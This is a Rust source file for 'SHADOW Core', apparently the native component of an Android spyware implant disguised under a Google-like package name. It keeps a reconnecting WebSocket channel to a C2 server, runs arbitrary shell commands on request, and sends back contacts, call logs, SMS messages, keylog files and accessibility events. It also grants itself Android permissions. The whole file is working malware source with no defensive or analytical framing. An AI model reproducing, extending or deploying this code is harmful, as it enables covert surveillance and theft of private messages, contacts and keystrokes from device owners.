//! SHADOW Core — Built-in command execution + WSS transport with reconnect.

pub mod transport;

use jni::objects::{JClass, JString};
use jni::JNIEnv;
use jni::sys::jint;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use tokio::runtime::Runtime;
use tokio::sync::mpsc;
use tracing::{error, info};

static STARTED: AtomicBool = AtomicBool::new(false);
static mut RUNTIME: Option<Runtime> = None;
static mut CORE: Option<Arc<ShadowCore>> = None;

// ---------------------------------------------------------------------------
// Built-in command execution (no external modules needed)
// ---------------------------------------------------------------------------

fn cmd_shell(cmd: &str) -> String {
    use std::process::Command;
    let output = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output();
    match output {
        Ok(o) => {
            let stdout = String::from_utf8_lossy(&o.stdout);
            let stderr = String::from_utf8_lossy(&o.stderr);
            if stderr.len() > 0 && stdout.len() == 0 {
                stderr.into_owned()
            } else if stderr.len() > 0 {
                format!("{}[STDERR] {}", stdout, stderr)
            } else {
                stdout.into_owned()
            }
        }
        Err(e) => format!("shell error: {}", e),
    }
}

fn cmd_contacts() -> String {
    cmd_shell("content query --uri content://com.android.contacts/contacts --projection display_name:1,starred:1 --where '1=1' 2>/dev/null | head -500")
}

fn cmd_calllog() -> String {
    cmd_shell("content query --uri content://call_log/calls --projection number:1,date:1,type:1,duration:1 --where '1=1' 2>/dev/null | head -200")
}

fn cmd_sms() -> String {
    cmd_shell("content query --uri content://sms/inbox --projection address:1,body:1,date:1 --where '1=1' 2>/dev/null | head -200")
}

fn cmd_grant(permission: &str) -> String {
    cmd_shell(&format!("pm grant com.google.android.contactsync android.permission.{} 2>&1", permission))
}

fn cmd_keylog_file() -> String {
    // Read today's keylog file
    let date = cmd_shell("date +%Y-%m-%d");
    let date_clean = date.trim();
    let path = format!("/data/data/com.google.android.contactsync/files/keylogs/keylog_{}.txt", date_clean);
    cmd_fs_read(&path)
}

fn cmd_keylog_list() -> String {
    cmd_fs_list("/data/data/com.google.android.contactsync/files/keylogs")
}

fn cmd_fs_list(path: &str) -> String {
    let entries = match std::fs::read_dir(path) {
        Ok(r) => r,
        Err(e) => return format!("fs error: {}", e),
    };
    let mut items = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().into_owned();
        let ftype = if entry.path().is_dir() { "d" } else { "f" };
        let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
        items.push(format!("{}\t{}\t{}", ftype, size, name));
    }
    items.sort();
    items.join("\n")
}

fn cmd_fs_read(path: &str) -> String {
    match std::fs::read_to_string(path) {
        Ok(c) => c,
        Err(e) => format!("fs error: {}", e),
    }
}

fn cmd_device_info() -> String {
    let mut info = serde_json::json!({
        "id": "implant",
        "arch": std::env::consts::ARCH,
        "os": "android",
    });
    // Read basic Android properties
    for prop in [("model", "ro.product.model"), ("brand", "ro.product.brand"),
                 ("android_version", "ro.build.version.release"),
                 ("sdk", "ro.build.version.sdk"),
                 ("security_patch", "ro.build.version.security_patch")] {
        let (key, prop_name) = prop;
        if let Ok(val) = std::process::Command::new("getprop").arg(prop_name).output() {
            let s = String::from_utf8_lossy(&val.stdout).trim().to_string();
            info[key] = serde_json::Value::String(s);
        }
    }
    info.to_string()
}

fn execute_command(cmd: &str, payload: &serde_json::Value) -> Option<String> {
    match cmd {
        "shell" => {
            let sh_cmd = payload.as_str()
                .or_else(|| payload.get("cmd").and_then(|v| v.as_str()))
                .unwrap_or("id");
            Some(cmd_shell(sh_cmd))
        }
        "fs" | "fs_list" | "ls" => {
            let path = payload.as_str()
                .or_else(|| payload.get("path").and_then(|v| v.as_str()))
                .unwrap_or("/sdcard");
            Some(cmd_fs_list(path))
        }
        "fs_read" | "cat" => {
            let path = payload.as_str()
                .or_else(|| payload.get("path").and_then(|v| v.as_str()))
                .unwrap_or("");
            if path.is_empty() { return Some("usage: cat <path>".into()); }
            Some(cmd_fs_read(path))
        }
        "device_info" | "info" => Some(cmd_device_info()),
        "ping" | "heartbeat" => Some("pong".into()),
        "contacts" => Some(cmd_contacts()),
        "calllog" => Some(cmd_calllog()),
        "sms" => Some(cmd_sms()),
        "grant" => {
            let perm = payload.as_str()
                .or_else(|| payload.get("permission").and_then(|v| v.as_str()))
                .unwrap_or("READ_CONTACTS");
            Some(cmd_grant(perm))
        }
        "keylog_file" => Some(cmd_keylog_file()),
        "keylog_list" => Some(cmd_keylog_list()),
        _ => None, // Unknown command — don't respond
    }
}

// ---------------------------------------------------------------------------
// Core
// ---------------------------------------------------------------------------

struct ShadowCore {
    domain: String,
    implant_id: String,
    module_dir: std::path::PathBuf,
    event_tx: mpsc::UnboundedSender<Vec<u8>>,
}

impl ShadowCore {
    async fn start(&self, mut event_rx: tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>) -> anyhow::Result<()> {
        let ws = transport::websocket::WsTransport::new(&self.domain, &self.implant_id);
        let (tx_send, rx_send) = mpsc::channel::<Vec<u8>>(100);

        // Wire a11y exfil events into transport outbound
        let event_tx_send = tx_send.clone();
        tokio::spawn(async move {
            while let Some(msg) = event_rx.recv().await {
                if event_tx_send.send(msg).await.is_err() { break; }
            }
        });

        // Heartbeat: tell the C2 we're alive every 60s
        let hb_tx = tx_send.clone();
        let hb_id = self.implant_id.clone();
        tokio::spawn(async move {
            loop {
                tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
                let hb = serde_json::json!({
                    "type": "heartbeat",
                    "id": hb_id,
                    "ts": std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .map(|d| d.as_millis()).unwrap_or(0),
                });
                if hb_tx.send(hb.to_string().into_bytes()).await.is_err() { break; }
            }
        });

        info!("SHADOW initialized. Implant ID: {}", self.implant_id);

        let _ = std::fs::create_dir_all(&self.module_dir);
        let rx_send_shared = std::sync::Arc::new(tokio::sync::Mutex::new(rx_send));
        // Clone the persistent outbound sender so the inbound handler can push responses
        let tx_outbound = tx_send.clone();

        // Transport connection loop with reconnect
        let ws_task = tokio::spawn(async move {
            let mut backoff = tokio::time::Duration::from_secs(2);
            let max_backoff = tokio::time::Duration::from_secs(60);

            loop {
                let (tx_internal, rx_internal) = mpsc::channel::<Vec<u8>>(100);
                let (tx_recv_internal, mut rx_recv_inner) = mpsc::channel::<Vec<u8>>(100);

                // Proxy persistent outbound queue into this connection's channel
                let rx_shared_clone = rx_send_shared.clone();
                let proxy = tokio::spawn(async move {
                    let mut lock = rx_shared_clone.lock().await;
                    while let Some(msg) = lock.recv().await {
                        if tx_internal.send(msg).await.is_err() { break; }
                    }
                });

                // Inbound: parse commands, execute, send response through the persistent outbound channel
                let reply_tx = tx_outbound.clone();
                let inbound = tokio::spawn(async move {
                    while let Some(msg) = rx_recv_inner.recv().await {
                        let text = String::from_utf8_lossy(&msg).into_owned();
                        info!("CMD <- C2: {}", &text[..text.len().min(200)]);

                        // Parse {"id":"...", "c":"...", "p":...}
                        if let Ok(v) = serde_json::from_str::<serde_json::Value>(&text) {
                            let cmd_id = v.get("id").and_then(|x| x.as_str()).unwrap_or("").to_string();
                            let cmd = v.get("c").and_then(|x| x.as_str()).unwrap_or("").to_string();
                            let payload = v.get("p").cloned().unwrap_or(serde_json::Value::Null);

                            if !cmd.is_empty() {
                                match execute_command(&cmd, &payload) {
                                    Some(result) => {
                                        let resp = serde_json::json!({
                                            "type": "result",
                                            "id": cmd_id,
                                            "cmd": cmd,
                                            "data": result,
                                            "ts": std::time::SystemTime::now()
                                                .duration_since(std::time::UNIX_EPOCH)
                                                .map(|d| d.as_millis()).unwrap_or(0),
                                        });
                                        if reply_tx.send(resp.to_string().into_bytes()).await.is_err() {
                                            error!("Failed to queue response for {}", cmd_id);
                                        }
                                        info!("RESULT -> C2: {} ({} bytes)", cmd, result.len());
                                    }
                                    None => {
                                        info!("Unknown command: {}", cmd);
                                    }
                                }
                            }
                        }
                    }
                });

                if let Err(e) = ws.connect(rx_internal, tx_recv_internal).await {
                    error!("Transport error: {}", e);
                }

                proxy.abort();
                inbound.abort();

                info!("WSS reconnecting in {:?}...", backoff);
                tokio::time::sleep(backoff).await;
                backoff = std::cmp::min(backoff * 2, max_backoff);
            }
        });

        Ok(())
    }
}

/// Forward an a11y event (keylog, notif, click) to the transport for exfil.
pub fn push_event(tag: &str, payload: &str) {
    let frame = format!("{{\"type\":\"event\",\"tag\":\"{}\",\"data\":{}}}", tag, payload);
    unsafe {
        if let Some(core) = CORE.as_ref() {
            let _ = core.event_tx.clone().send(frame.into_bytes());
        }
    }
}

// ---------------------------------------------------------------------------
// JNI interface
// ---------------------------------------------------------------------------

#[no_mangle]
pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
    mut env: JNIEnv,
    _: JClass,
    domain_jstr: JString,
    id_jstr: JString,
) -> jint {
    android_logger::init_once(
        android_logger::Config::default()
            .with_tag("ShadowCore")
            .with_max_level(log::LevelFilter::Info),
    );

    if STARTED.swap(true, Ordering::SeqCst) {
        return 0;
    }

    let domain: String = env.get_string(&domain_jstr).unwrap().into();
    let implant_id: String = env.get_string(&id_jstr).unwrap().into();

    unsafe {
        RUNTIME = Some(Runtime::new().unwrap());
        let runtime = RUNTIME.as_ref().unwrap();

        runtime.block_on(async {
            let (event_tx, event_rx) = mpsc::unbounded_channel::<Vec<u8>>();

            let core = Arc::new(ShadowCore {
                domain: domain.clone(),
                implant_id: implant_id.clone(),
                module_dir: std::path::PathBuf::from(
                    "/data/data/com.google.android.contactsync/files/modules"
                ),
                event_tx,
            });

            CORE = Some(core.clone());

            tokio::spawn(async move {
                if let Err(e) = core.start(event_rx).await {
                    error!("Core start failed: {}", e);
                }
            });

            0
        })
    }
}

#[no_mangle]
pub extern "system" fn Java_com_shadow_ShadowCore_nativeLogEvent(
    mut env: JNIEnv,
    _: JClass,
    entry_jstr: JString,
) {
    let entry: String = match env.get_string(&entry_jstr) {
        Ok(s) => s.into(),
        Err(_) => return,
    };
    push_event("a11y", &serde_json::to_string(&entry).unwrap_or(entry));
}
